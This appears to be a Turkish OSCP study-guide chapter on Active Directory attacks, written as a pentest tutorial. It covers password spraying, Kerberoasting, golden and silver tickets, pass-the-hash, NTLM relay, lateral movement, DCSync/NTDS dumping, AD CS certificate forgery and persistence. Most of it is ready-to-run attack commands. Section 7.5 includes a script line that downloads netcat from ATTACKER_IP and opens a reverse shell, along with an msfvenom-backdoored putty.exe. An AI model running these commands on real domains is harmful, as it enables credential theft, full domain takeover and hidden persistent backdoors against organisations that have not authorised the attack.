---
title: "Bölüm 7 — AD: Kimlik Doğrulama Saldırıları, Yatay Hareket & Kalıcılık"
date: 2026-10-22 11:00:00 +0300
categories: [OSCP, Active Directory]
tags: [active-directory, kerberoast, as-rep, pass-the-hash, dcsync, lateral-movement]
oscp: true
toc: true
permalink: /oscp/07-ad-saldirilari/
---
{% raw %}
Bu bölüm, domain keşfi ([Bölüm 6](/oscp/06-ad-enumerasyon/)) sonrası aşamadır:
elde edilen bilgi ve ilk credentialler ile kimlik doğrulama protokollerine
(NTLM/Kerberos) saldırmak, yatay hareket etmek ve kalıcılık kurmak.
Kural: **her teknik önce DÜŞÜK yetkili credentialla denenir; yüksek yetkiye
sadece zorunluysa geçilir.** Saldırı zincirleri: spray → roast → relay →
lateral → domain admin → DCSync/NTDS → golden ticket → kalıcılık.

Placeholder'lar: `TARGET` (hedef), `<KULLANICI>`, `<PAROLA>`, `<HASH>` (NTLM),
`<DOMAIN>`, `<SID>`, `<KRBTGT_NTLM>`. Boş parolalı hesabın bilinen NTLM hash'i:
`aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0`.

## 1. Password Spraying

### 1.1 Ne / ne zaman
Bir kullanıcıya çok parola denemektense (lockout riski), **tek parolayı çok
kullanıcıya** denemek. Lockout eşiği bilinmeden, düşük frekansla ve genel
parolalarla (`Winter2026!`, `Company123!` vb.) yapılır. LDAP, SMB, OWA,
RDWeb, Kerberos (`kerbrute`) üzerinden uygulanabilir.

### 1.2 Komutlar
```bash
# Kullanıcı listesi çıkarma (anonymous LDAP bind açıksa ya da düşük yetkili cred ile)
impacket-GetADUsers <DOMAIN>/ -all -dc-ip TARGET | tee users.txt

# Kerberos üzerinden spray — lockout görünür, SMB'den daha sessiz
kerbrute passwordspray --dc TARGET -d <DOMAIN> users.txt '<PAROLA>'

# SMB üzerinden spray (crackmapexec/nxc)
nxc smb TARGET -d <DOMAIN> -U users.txt -p '<PAROLA>' --continue-on-success

# OWA/HTTPS üzerinden
msfconsole -q -x "use auxiliary/scanner/http/owa_login; set rhosts TARGET; \
  set user_file users.txt; set password '<PAROLA>'; run"
```

**Tuzaklar / notlar:**
- Lockout threshold öğrenilmeden (Bölüm 6'daki `net accounts` çıktısı) tek
  parola ile bile dikkatli ilerle; `-d` gecikme ve loglama eklemek iyi pratik.
- SMB spraying `STATUS_ACCOUNT_LOCKED_OUT` / `STATUS_ACCOUNT_DISABLED` dışı
  cevapları dikkatli oku: `STATUS_LOGON_FAILURE` ≠ başarısız her şey.
- Spray sonucu başarılı credentialleri anında NXC/SMB ile doğrula ve sakla
  (`cmedb`: `hosts`, `creds` tabloları).
- Kerberos (pre-auth) spraying'de `KDC_ERR_PREAUTH_FAILED` → yanlış parola,
  `KDC_ERR_C_PRINCIPAL_UNKNOWN` → kullanıcı yok. Kullanıcı adı
  enumerasyonu için de kullanılabilir.

## 2. Kerberos'a Saldırılar

### 2.1 AS-REP Roasting
**Ne:** `DONT_REQUIRE_PREAUTH` (UF_DONT_REQUIRE_PREAUTH) bayrağı açık
kullanıcıların TGT'si herkese açık olarak istenebilir; gelen AS-REP
offline kırılabilir (RC4 ile).

```bash
# Hedef hesapların pre-auth gerektirmediğini bul (Kerberos hata kodundan)
impacket-GetNPUsers <DOMAIN>/ -dc-ip TARGET -usersfile users.txt
impacket-GetNPUsers <DOMAIN>/<KULLANICI> -no-pass -dc-ip TARGET   # kredisi boş hesaplar

# Hemen hash'i al (impaktet tek hesap için)
impacket-GetNPUsers <DOMAIN>/ -dc-ip TARGET -request -format hashcat

# Windows tarafında (domain'e bağlı makinede):
.\Rubeus.exe asreproast /nowrap

# Kırma
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

**Tuzaklar / notlar:**
- `/format hashcat` çıktısını `18200`, john kullanacaksan `krb5asrep` formatını tercih et.
- Rubeus çıktısındaki `rc4_hmac` hash'ini kopyala; kirbi satırı hash değildir.
- UAC bayrağı `0x400000` (DONT_REQUIRE_PREAUTH) — keşifte bulunan özel
  hesapları (servis, test hesapları) öncelle.

### 2.2 Kerberoasting
**Ne:** Domain kullanıcısı olan herkes, SPN'si olan herhangi bir hesap için
TGS isteyebilir. TGS servis anahtarıyla (genelde zayıf parolalı servis
hesabı) şifrelidir → offline kırılır.

```bash
# Linux
impacket-GetUserSPNs <DOMAIN>/<KULLANICI>:<PAROLA> -dc-ip TARGET -request
impacket-GetUserSPNs <DOMAIN>/<KULLANICI>:<PAROLA> -dc-ip TARGET -request -outputfile kerberoast.hash

# Windows
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Veya PowerView ile SPN'li hesapları bul:
Import-Module .\PowerView.ps1; Get-NetUser -SPN | select samaccountname,serviceprincipalname

# Kırma
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

**Tuzaklar / notlar:**
- `KRB_AP_ERR_SKEW (Clock skew too great)` hatası = saat uyumsuz. Düzelt:
```bash
ntpdate -qu TARGET      # farkı göster
sudo ntpdate TARGET     # eşitle
```
- Hedef hesap tercihi: parolası güçlü olmayan, insan tarafından kullanılan
  servis hesapları (mssql, backup, svc*). Machine account'ları ($ ile biten)
  128 karakterli rastgele parolalıdır — kırmaya değmez.
- RC4 istemek için Rubeus'ta `/rc4opsec`, impacket'te gerekirse.

### 2.3 Golden Ticket
**Ne:** `krbtgt` hesabının NTLM/AES hash'i + domain SID'i ile sahte TGT
üretmek. Domain'deki HERHANGİ bir kullanıcıyı taklit eder; kırılan hash iki
kez rotate edilmedikçe kalıcıdır.

```bash
# Ön koşul: krbtgt hash + domain SID (DC'de DA olarak ya da DCSync ile)
mimikatz # lsadump::lsa /patch          # ya da /inject /name:krbtgt
# Domain SID: whoami /user çıktısından (son -RID atılmış hali)

# Ticket üret + mevcut oturuma inject et
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:<KULLANICI> /domain:<DOMAIN> \
    /sid:<SID> /krbtgt:<KRBTGT_NTLM> /ptt

# Doğrula
mimikatz # misc::cmd          # yeni cmd'de yüklenen ticket aktif
dir \\<DC_HOSTNAME>\c$        # HİÇBİR ZAMAN IP değil — Kerberos hostname ister
```

Diğer önemli parametreler: `/id:500` (Administrator RID), `/endin:600`
(default 10 yıl → gerçekçi politika değerine çek, anomali olur),
`/renewmax:10080`, `/groups:` ek gruplar, `/sids:` (child→parent trust
saldırısında Enterprise Admins SID'i eklemek için).

**Tuzaklar / notlar:**
- PsExec ile hedefe **IP** ile bağlanırsan Kerberos yerine NTLM'e düşer ve
  golden ticket çalışmaz → hostname kullan.
- Ekim 2022 patch'i sonrası PAC_REQUESTOR doğrulanır; gerçek olmayan
  kullanıcı adı artık her ortamda çalışmaz, mevcut bir hesap adı kullan.
- Muhasebe yapan blue team için fark edilmesi zor — ticket ömrünü politika
  ile sınırlı tut.

### 2.4 Silver Ticket
**Ne:** Bir servisin **machine account** NTLM hash'i ile o servise özel sahte
TGS üretmek. DC'ye başvurmadan çalışır → Daha sessiz. Kalıcılık için altın
değer: krbtgt rotate edilse bile etkilenmez, tüm machine account'ları
rotate edilmek gerekir.

```bash
# Gerekli: hedef makinenin machine account hash'i (mimikatz ile ya da DCSync /all) + domain SID
mimikatz # kerberos::golden /sid:<SID> /domain:<DOMAIN> /ptt \
    /target:<HOSTNAME>.<DOMAIN> /service:http /rc4:<MACHINE_NTLM> /user:<KULLANICI>

klist    # yüklendiğini doğrula
```

**Tuzaklar / notlar:**
- PAC doğrulaması servis tarafında zorunlu değildir; çoğu servis yapmaz.
  Yapan varsa (bazı IIS/SQL ayarları) ticket reddedilir — başka servis dene
  (cifs, http, ldap, mssql).
- Kapsam: yalnızca belirtilen host + servis. DC'ye dokunmaz.
- Saldırıyı önlemek için her makine hesabının parolası rotate edilmeli →
  savunması golden ticket'tan zor.

## 3. NTLM'e Saldırılar

### 3.1 Pass-the-Hash (PtH)
**Ne:** NTLM hash'i doğrudan parola yerine kullanmak. Windows local hash
(SAM) ya da domain NTLM hash'i ile çalışır.

```bash
# Linux — NXC ile tarama (smb/winrm/ldap aynı anda ayrı ayrı dene)
nxc smb TARGET/24 -d <DOMAIN> -u <KULLANICI> -H <HASH>            # domain yetkili
nxc smb TARGET/24 -u administrator -H <HASH> --local-auth          # lokal admin

# Tek makineye bağlan
impacket-psexec <DOMAIN>/<KULLANICI>@TARGET -hashes <HASH>
impacket-wmiexec <DOMAIN>/<KULLANICI>@TARGET -hashes <HASH>
impacket-smbexec <DOMAIN>/<KULLANICI>@TARGET -hashes <HASH>
evil-winrm -i TARGET -u <KULLANICI> -H <HASH>                    # NTLM hash (LM bölümü yok)
xfreerdp /v:TARGET /u:<KULLANICI> /pth:<NTLM_HASH>               # Restricted Admin gerekli

# Windows (mimikatz) — sekurlsa::pth yüklü credential ile yeni proses açar
mimikatz # sekurlsa::pth /user:<KULLANICI> /domain:<DOMAIN> /ntlm:<NTLM> /run:powershell
```

**Tuzaklar / notlar:**
- Windows'ta `sekurlsa::pth` sonrası **mevcut shell eski kullanıcıdır**;
  token'lar yeni proseslerde geçerli. Hepsinden önce `token::revert`
  (elevate edilmiş token ile pth çalışmaz) ve sonrasında `misc::cmd`.
- Domain account ile PtH, hedefin aynı domain üyesi olmasını ister.
- `lm:ntlm` formatında hash veriyorsan ilk kısım boşsa
  `aad3b435b51404ee...` sabit değeridir.
- SMB Signing enforced ise PtH relay çalışmaz (aşağıya bak).

### 3.2 Overpass-the-Hash / Pass-the-Key
**Ne:** NTLM (RC4) ya da AES anahtarı ile KDC'den **gerçek TGT** istemek.
PtH'in Kerberos versiyonu; elde edilen TGT ile normal Kerberos akışıyla
tüm servislere erişilir.

```bash
# AES anahtarlarını memory'den çek
mimikatz # sekurlsa::ekeys

# RC4 (NTLM hash) ile TGT iste — yeni proses açılır
mimikatz # sekurlsa::pth /user:<KULLANICI> /domain:<DOMAIN> /rc4:<NTLM> /run:powershell
# AES256 ile:
mimikatz # sekurlsa::pth /user:<KULLANICI> /domain:<DOMAIN> /aes256:<AES256> /run:cmd

# Ticket'ın yüklendiğini doğrula, sonra hostname ile bağlan
net use \\<HOSTNAME>.<DOMAIN>
.\PsExec.exe \\<HOSTNAME> cmd
```

**Tuzaklar / notlar:**
- Kaynaklara gidmeden önce `klist` ile ticket'ın geldiğinden emin ol;
  olmadıysa hedefe hostname (IP değil) ile `net use` dene.
- RC4 ile TGT istemek overpass-the-hash uyarısı tetikleyebilir; AES
  kullanılabiliyorsa `/aes256` kullan (daha az anomali).

### 3.3 Pass-the-Ticket (PtT)
**Ne:** Memory'den (ya da .kirbi dosyasından) çalınan bir Kerberos
ticket'ını kendi oturumuna enjekte etmek.

```bash
# Ticket'ları dışa aktar (memory'den)
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
dir *.kirbi

# Seçili TGS/TGT'i enjekte et
mimikatz # kerberos::ptt <TICKET>.kirbi
klist
ls \\<HOSTNAME>\backup        # ticket'ın kapsadığı kaynağa git
```

**Tuzaklar / notlar:**
- Ticket + **oturum anahtarı (session key)** birlikte gerekir; yalnızca
  kirbi dosyası yetmeyebilir. Memory'den export doğru yol.
- PtT yalnızca mevcut oturumu etkiler; önceki yetkiler geçerlidir. Daha
  yüksek yetkili bir ticket bulduysan önce ptt yap sonra psexec.
- Ticket'ın ömrü sınırlı; hızlı hareket et.

### 3.4 NTLM Relay (impacket ntlmrelayx)
**Ne:** Kimlik doğrulama isteği (SMB/HTTP/LDAP) ele geçirilip başka bir
host'a iletilir. Genelde LLMNR/NBT-NS poisoning + SpoolSample/coercion
(PetitPotam, PrinterBug) ile tetiklenir. Koşul: hedefte **SMB signing
zorunlu değil**.

```bash
# 1) Signing kontrolü (relay edilebilir hostları bul)
nmap --script=smb2-security-mode -p445 TARGET_LIST

# 2) Responder ile poisoning başlat (SMB/HTTP servislerini kapat)
sudo responder -I eth0 -dwv

# 3) Relay — ele geçirilen auth'ı hedefe ilet, komut çalıştır
impacket-ntlmrelayx -smb2support -t smb://TARGET -c 'whoami /all'
impacket-ntlmrelayx -smb2support -t ldaps://<DC> --shadow-credentials --shadow-target <HOSTNAME>$
# Sadece kırılacak hash topla:
impacket-ntlmrelayx -smb2support -tf relay_targets.txt -of relayed.hashes

# 4) Kimlik doğrulama tetikleme (hedef makineden attacker'a)
.\SpoolSample.exe <KAYNAK_HOSTNAME> <ATTACKER_IP>     # Print Spooler çalışıyorsa
# LDAPS relay ile bilgisayar hesabı üzerinde RBCD/shadow cred ayarlanabilir
```

**Tuzaklar / notlar:**
- Relay hedefi **IP** ile belirt; hostname verirsen Kerberos'e geçip relay
  bozulur.
- Signing enforced (aynı zamanda "allowed" değil "required") ise SMB relay
  çalışmaz → LDAP/LDAPS relay veya başka host dene.
- DC'ye relay ediyorsan LDAPS şart (LDAP signing/channel binding).
- `-c` komutu SYSTEM bağlamında çalışır; çıktı görünmez → reverse shell kullan.
- BloodHound cypher ile computer→group→AdminTo zinciri bulmak, relay
  adaylarını belirler.

## 4. Yatay Hareket (Lateral Movement)

Hangi protokolün çalışacağı: hedefin portları + senin yetkin. Özet tablo:

| Yöntem | Port | Gerekli yetki |
|---|---|---|
| PsExec / SMB servis | 445 | Administrators |
| WinRM (5985/5986) | 5985/5986 | Remote Management Users |
| WMI / DCOM | 135 + 49152-65535 | Administrators |
| sc.exe servis | 445, 135 | Administrators |
| schtasks | 445 (SMB pipe) | Administrators |

### 4.1 PsExec
**Ne:** SMB üzerinden uzak servis oluşturup çalıştırma. Yönetici yetkisi ister.

```bash
# Linux
impacket-psexec <DOMAIN>/<KULLANICI>:<PAROLA>@TARGET
impacket-psexec <DOMAIN>/<KULLANICI>@TARGET -hashes <HASH>

# Windows (Sysinternals)
PsExec64.exe \\TARGET -u <DOMAIN>\<KULLANICI> -p <PAROLA> -i cmd.exe
```

**Tuzaklar / notlar:**
- Windows PsExec, `-u/-p` versen bile **mevcut shell'in kullanıcısının**
  credential'larıyla dener → önce `runas /user:<DOMAIN>\<KULLANICI> cmd`,
  sonra PsExec'i o pencerede çalıştır.
- Yeni servis oluşturur (PSEXESVC) → yüksek gürültülü; AV/EDR tetikler.
- Alternatifi smbexec (servis yerine pipe kullanır, biraz daha sessiz).

### 4.2 WinRM
**Ne:** 5985 (HTTP) / 5986 (HTTPS) üzerinden PowerShell remoting. Yetki
olarak Administrators'a gerek yok, "Remote Management Users" yeterli.

```bash
# Linux
evil-winrm -i TARGET -u <KULLANICI> -p <PAROLA>
evil-winrm -i TARGET -u <KULLANICI> -H <NTLM_HASH>
# cred'lardan paylaşılan dosya indir: evil-winrm içinde download <path>

# Windows — credential objesi + session
$username = '<KULLANICI>'; $password = '<PAROLA>'
$secureString = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

New-PSSession -ComputerName TARGET -Credential $credential
Enter-PSSession -ComputerName TARGET -Credential $credential
Invoke-Command -ComputerName TARGET -Credential $credential -ScriptBlock {whoami}

# Ya da cmd üzerinden:
winrs.exe -u:<KULLANICI> -p:<PAROLA> -r:TARGET cmd
```

**Tuzaklar / notlar:** NTLMv2 devre dışı/WinRM kısıtlıysa Kerberos
gerekir; Kerberos'ta `-ComputerName` yerine FQDN hostname şart (SPN
eşleşmesi). CredManager'a kayıtlı cred ile `Enter-PSSession` doğrudan çalışır.

### 4.3 WMI / CIM
**Ne:** 135 + dinamik RPC portları (DCOM) ya da Wsman üzerinden process
ve servis yönetimi. Çıktı döndürmez (blind).

```bash
# Windows — CIM session aç (DCOM veya Wsman protokolü)
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-CimSession -ComputerName TARGET -Credential $credential -SessionOption $Opt

# Uzak process oluştur
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create `
    -Arguments @{ CommandLine = "powershell.exe -nop -w hidden -e <B64>" }

# Legacy: wmic
wmic /node:TARGET /user:<KULLANICI> /password:<PAROLA> process call create "cmd /c calc"

# Linux
impacket-wmiexec <DOMAIN>/<KULLANICI>:<PAROLA>@TARGET
impacket-wmiexec <DOMAIN>/<KULLANICI>@TARGET -hashes <HASH>
```

**Tuzaklar / notlar:** WMI çıktı vermez; sonucu dosya yazdır ya da
reverse shell bağla. `ReturnValue = 0` = başarı.

### 4.4 Servis ve Zamanlanmış Görevler (sc.exe / schtasks)
**Ne:** Admin yetkisiyle uzak makinede servis ya da görev oluşturup payload
çalıştırmak. Sessiz alternatif.

```bash
# Servis oluştur + çalıştır (blind)
sc.exe \\TARGET create THMservice binPath= "net user <YENI> <PAROLA> /add" start= auto
sc.exe \\TARGET start THMservice
sc.exe \\TARGET delete THMservice

# Mevcut servisin binPath'ini değiştir (daha gizli)
sc.exe \\TARGET config <SERVIS> binPath= "C:\payload.exe" start= auto

# Zamanlanmış görev
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<KOMUT>" /sc ONCE /sd 01/01/1970 /st 00:00
schtasks /s TARGET /run /TN "THMtask1"
schtasks /s TARGET /TN "THMtask1" /DELETE /F

# Payload üret
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=<ATTACKER_IP> LPORT=4444 -o myservice.exe
smbclient -c 'put myservice.exe' -U '<KULLANICI>' -W '<DOMAIN>' '//TARGET/admin$/'
```

**Tuzaklar / notlar:** `binPath=` sonrası boşluk şart (sc.exe sözdizimi).
Servis payload'ları `exe-service` formatında olmalı; normal exe
services.exe tarafından kapanabilir. Görev temizliğini unutma.

### 4.5 DCOM (MMC20.Application)
**Ne:** DCOM nesnelerini uzaktan instantiate ederek process çalıştırmak.
Gerekli: yerel admin + hedefte DCOM açık. EDR'de PsExec/WinRM yerine az
bilinen yol.

```bash
# PowerShell — MMC 2.0 uygulamasını uzaktan başlat
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","TARGET"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <B64_REVSHELL>","7")
```

**Tuzaklar / notlar:** String uzunluğu sınırlıysa payload'ı kısa tut ya da
stager indir. Diğer ProgID'ler: `ShellWindows`, `ExcelDDE` (Office
kuruluysa).

## 5. Domain Admin'a Yükselme: DCSync & NTDS.dit

### 5.1 DCSync
**Ne:** DRSR (Directory Replication Service Remote) protokolüyle kendini
DC gibi gösterip tüm kullanıcı hash'lerini çekmek. Yetki: `Replicating
Directory Changes All` (default DA/EA). Mimikatz veya impacket.

```bash
# Linux — tek hesap veya tüm domain
impacket-secretsdump <DOMAIN>/<DA_KULLANICI>:<PAROLA>@<DC_IP>
impacket-secretsdump <DOMAIN>/<DA_KULLANICI>@<DC_IP> -just-dc
impacket-secretsdump <DOMAIN>/<DA_KULLANICI>@<DC_IP> -just-dc-ntlm -outputfile hashes

# Windows — mimikatz, yetkili kullanıcı bağlamında çalıştır
mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\<ADMIN>
mimikatz # log dcdump.txt                      # log'u aç
mimikatz # lsadump::dcsync /domain:<DOMAIN> /all
```

Reversible encryption (UAC bit 128) açık hesaplarda cleartext de düşer;
hashler `impacket-secretsdump` çıktısında NTLM + Kerberos keys olarak gelir.

**Tuzaklar / notlar:**
- Tek parola hash'i için bile DCSync DC trafiği üretir → çok sayıda
  replication isteği (4662 event) savunmada alarmdır. `/all` yerine hedefli
  hesapları tercih et.
- Yetki kontrolü (hangi hesap DCSync yapabilir?):
```powershell
Get-ObjectAcl "DC=<DOMAIN>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get') }
```

### 5.2 NTDS.dit Çıkarma (vshadow / Volume Shadow Copy)
**Ne:** Domain admin yetkisiyle DC'de shadow copy alıp `ntds.dit` +
`SYSTEM` hive'ını dışarı çıkarmak; offline hash extraction.

```bash
# DC üzerinde, yükseltilmiş cmd
vshadow.exe -nw -p C:
# Çıktıdaki "Shadow copy device name"ı not al: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit" c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak

# Dosyaları Kali'ye taşı (smbclient/scp ile), sonra:
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

**Tuzaklar / notlar:**
- Shadow copy oluşumu loglanır ve ntds.dit'i doğrudan kopyalamak (açık
  dosya) hata verir → shadow copy şart. Alternative: `vssadmin create shadow`.
- `SYSTEM` hive olmadan dit şifresi çözülmez — ikisi birlikte.
- İş bitince shadow copy'yi sil (`vshadow -ds={SNAPSHOT_ID}`), dosyaları temizle.
- Çıkan hash'lerle PtH, golden ticket (krbtgt) ve yeni kırma döngüleri başlar.

## 6. AD CS (Active Directory Certificate Services) Saldırıları

### 6.1 Zafiyetli Template Bulma (certipy)
**Ne:** AD CS template'lerinde `ENROLLEE_SUPPLIES_SUBJECT` (SAN yazma),
`Client Authentication` EKU ve düşük enrollment yetkisi birleşirse herhangi
bir kullanıcı herhangi bir hesabı taklit eden sertifika isteyebilir
(ESC1). Daha birçok ESC varyantı vardır.

```bash
# Keşif (Linux)
certipy-ad find -u '<KULLANICI>@<FQDN>' -p '<PAROLA>' -dc-ip <DC_IP> -vulnerable -enabled
nxc ldap <DC_IP> -u <KULLANICI> -p <PAROLA> -M adcs

# Windows: template dump
certutil -Template -v > templates.txt
# Tehlikeli bayraklar: Client Authentication, ENROLLEE_SUPPLIES_SUBJECT,
# EXPORTABLE_KEY + enrollment yetkisi
```

### 6.2 ESC1 — Kullanıcı Taklidi
```bash
# Sertifika iste — SAN olarak hedef admin UPN'i yaz
certipy-ad req -u '<KULLANICI>@<FQDN>' -p '<PAROLA>' -dc-ip <DC_IP> \
    -target <CA_HOST> -ca '<CA_ADI>' -template '<TEMPLATE>' -upn '<HEDEF>@<FQDN>'

# PFX ile TGT al (hash düşer)
certipy-ad auth -pfx <HEDEF>.pfx

# Düşen NT hash ile PtH
impacket-psexec <FQDN>/<HEDEF>@<DC_IP> -hashes aad3b435b51404eeaad3b435b51404ee:<NT>
```

**Tuzaklar / notlar:**
- İşlem öncesi `/etc/hosts`'a domain + CA host adlarını DC IP'sine ekle —
  Kerberos/DNS çözümlemesi şart.
- `.pfx` parolasını certipy'nin sorduğu şekilde belirle; auth aşamasında lazım.
- PFX'ten gelen TGT'yi `mimikatz # kerberos::ptt <TGT>.kirbi` ile de yükleyebilirsin.

### 6.3 CA Private Key Çalma (ForgeCert / kalıcı sertifika)
**Ne:** CA sertifikasını DC'den export edip istediğin herhangi bir kullanıcı
için Client Authentication sertifikası üretmek. **Son derece invaziv —
gerçek ortamda domain rebuild gerektirir; yalnızca açık onayla kullan.**

```bash
# DC üzerinde mimikatz ile export'a izin ver ve anahtarı çıkar
mimikatz # crypto::capi
mimikatz # crypto::cng
mimikatz # crypto::certificates /systemstore:local_machine /export
# PFX export parolası default: mimikatz   →  <CA>.pfx

# Hedef hesap için sertifika üret (ForgeCert)
.\ForgeCert.exe --CaCertPath <CA>.pfx --CaCertPassword mimikatz `
    --Subject "CN=User" --SubjectAltName <HEDEF>@<FQDN> `
    --NewCertPath fullAdmin.pfx --NewCertPassword <YENI_PAROLA>

# Rubeus ile TGT iste
.\Rubeus.exe asktgt /user:<HEDEF> /enctype:aes256 /certificate:fullAdmin.pfx `
    /password:<YENI_PAROLA> /outfile:<HEDEF>.kirbi /domain:<FQDN> /dc:<DC_IP>
mimikatz # kerberos::ptt <HEDEF>.kirbi
```

**Tuzaklar / notlar:** ForgeCert üretilen sertifika CA rotate edilene kadar
geçerlidir — kalıcılık için ideal, temizlenmesi imkansıza yakındır.
Rubeus'ta `/enctype:aes256` belirt (default zayıf RC4 → overpass-the-hash
uyarısı).

## 7. Kalıcılık (Persistence)

### 7.1 Credential ile Kalıcılık
**Ne:** Her zaman DA gerekmez. Şunlar yeterli kalıcılık sağlar:
- Birden çok makinede lokal admin olan grup üyelerinin credential'ları
  (workstation admin grubu + server admin grubu).
- Delegasyon yetkisi olan servis hesapları (silver ticket, delegation
  saldırıları için).
- Exchange, WSUS, SCCM gibi ayrıcalıklı AD servislerinin hesapları.

Kaydedilecekler: NTLM/AES hash'ler, .kirbi ticket'ları, export edilmiş
PFX'ler — hepsi şifreli not deposuna.

### 7.2 Golden Ticket ile Kalıcılık (özet)
Golden ticket üretimi Bkz. 2.3. Kalıcılık bağlamında kritik noktalar:
```bash
mimikatz # kerberos::golden /user:<GERCEK_HESAP> /domain:<DOMAIN> /sid:<SID> \
    /krbtgt:<KRBTGT_NTLM> /endin:600 /renewmax:10080 /ptt
```
- Ömür değerlerini domain politikasına benzet (`/endin:600`, `/renewmax:10080`);
  10 yıllık ticket anomali olarak patlar.
- 2022 sonrası patch ile gerçek hesap adı kullanmak zorunlu.
- Temizleme: krbtgt parolası **iki kez** rotate edilmeli (tek rotate yeterli
  değildir — KVNO tutarsızlığı).
- Daha gizli alternatif: silver ticket (2.4) — tüm machine account'lar
  rotate edilmedikçe etkin kalır.

### 7.3 Yeni Kullanıcı Ekleme (DA ile)
**Ne:** Basit, görünür ama etkili; parola politikasına uygun görünmez
kullanıcı adı seç.

```bash
net user <YENI> <PAROLA> /add /domain
net group "Domain Admins" <YENI> /add /domain
net localgroup administrators <YENI> /add        # hedef makinede lokal admin
```

**Tuzaklar / notlar:** Event 4720/4728 loglanır; gürültülüdür. Parolayı
politikaya uygun seç (yoksa `NET HELPMSG 2245`). Temizlik planı önceden yaz.

### 7.4 Sertifika ile Kalıcılık
Bkz. 6.3 — ForgeCert ile üretilen sertifikalar CA anahtarı rotate
edilmedikçe çalışır. İşlem öncesi onay al; geri alınması en zor yöntemdir.

### 7.5 Share Üzerinde Backdoor (LNK / .exe injection)
**Ne:** Kullanılan paylaşımlara payload enjekte etmek (kullanıcı
tetiklediğinde shell düşer).

```bash
# .vbs içine satır ekle + nc64.exe aynı share'e koy
CreateObject("WScript.Shell").Run "cmd /c copy /Y \\<ATTACKER_IP>\share\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <ATTACKER_IP> 4444", 0, True

# .exe (örn. putty.exe) backdoor — hâlâ çalışır
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<ATTACKER_IP> lport=4444 -b "\x00" -f exe -o puttyX.exe

# LNK ile share'den ikon/UNC tetikleme (NXC slinky modülü)
nxc smb TARGET -d <DOMAIN> -u <KULLANICI> -p <PAROLA> -M slinky -o NAME=test SERVER=<ATTACKER_IP>
```

**Tuzaklar / notlar:** Slinky mevcut paylaşımlara .lnk bırakır; regular
erişimlerde tetiklenir. Sorumluluğu hedef kullanıcıya atmadan önce ROE'de
kullanıcı tetiklemeli tekniklerin izinli olduğunu doğrula.

## 8. Saldırı Zinciri Örnek Akışı (OSCP sınav pratiği)

```bash
# 1) Keşiften sonra: spray
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<PAROLA>'
# 2) Bulunan cred ile Kerberoast / AS-REP roast
impacket-GetUserSPNs <DOMAIN>/<KULLANICI>:<PAROLA> -dc-ip <DC_IP> -request
# 3) Kırılan servis hesabı ile yatay hareket
nxc smb TARGET/24 -d <DOMAIN> -u <KULLANICI> -p <PAROLA> --shares
evil-winrm -i TARGET -u <KULLANICI> -p <PAROLA>
# 4) Makinede mimikatz: SAM/LSA dump → PtH / overpass
mimikatz # privilege::debug
mimikatz # sekurlsa::msv
mimikatz # sekurlsa::ekeys
# 5) DA olduktan sonra: DCSync + NTDS dump
impacket-secretsdump <DOMAIN>/<DA>@<DC_IP> -just-dc
# 6) Kalıcılık: golden ticket + gerekli hesapların hash kaydı
mimikatz # kerberos::golden /user:<GERCEK> /domain:<DOMAIN> /sid:<SID> /krbtgt:<KRBTGT> /ptt
```

**Genel tuzaklar:**
- Kerberos tekniklerinde (golden/silver ticket, overpass, kerberoasting)
  **zaman senkronu** şart — önce `sudo ntpdate <DC_IP>`.
- Hedefe hostname ile bağlan (Kerberos SPN eşleşmesi); IP kullanmak NTLM'e
  düşürür ve ticket'ları etkisizleştirir.
- Her yeni credential için `nxc smb` sweep yap (genel admin parolası /
  parola yeniden kullanımı sık görülür).
- Bölüm 8'de ([Pivoting & Tünelleme](/oscp/08-pivoting/)) bu erişimleri
  diğer subnetlere taşıma teknikleri anlatılır.
{% endraw %}


[← Bölüm 6](/oscp/06-ad-enumerasyon/) · [Bölüm 8 →](/oscp/08-pivoting/)
